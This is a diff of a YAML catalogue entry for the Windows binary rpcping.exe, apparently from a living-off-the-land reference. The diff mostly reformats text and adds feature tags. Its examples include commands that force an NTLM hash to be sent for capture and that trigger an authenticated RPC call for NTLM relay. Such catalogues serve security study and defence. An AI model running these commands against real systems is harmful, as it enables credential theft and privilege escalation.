@@ -2,7 +2,8 @@
 id: windows-credential-rpcping
 namespace: windows:credential:rpcping
 name: rpcping
-description: 'Used to verify rpc connection Located at: C:\Windows\System32\rpcping.exe; C:\Windows\SysWOW64\rpcping.exe.'
+description: 'Used to verify rpc connection Located at: C:\Windows\System32\rpcping.exe;
+  C:\Windows\SysWOW64\rpcping.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -41,7 +42,12 @@ resource_profile:
 allowed-tools:
 - rpcping
 parameters: []
-features: []
+features:
+- file-system
+- network-intensive
+- pipes-stdin
+- pipes-stdout
+- remote
 execution:
   template: rpcping
   sandbox: execFile
@@ -49,9 +55,12 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process. (Capture credentials on a non-standard port)
+- description: Send a RPC test connection to the target server (-s) and force the
+    NTLM hash to be sent in the process. (Capture credentials on a non-standard port)
   command: rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
-- description: Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set). (Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port)
+- description: Trigger an authenticated RPC call to the target server (/s) that could
+    be relayed to a privileged resource (Sign not Set). (Relay a NTLM authentication
+    over RPC (ncacn_ip_tcp) on a custom port)
   command: rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
 references:
 - label: RedTips
@@ -76,7 +85,6 @@ install:
   commands:
   - choco install rpcping
 ---
-
 
 # rpcping
 
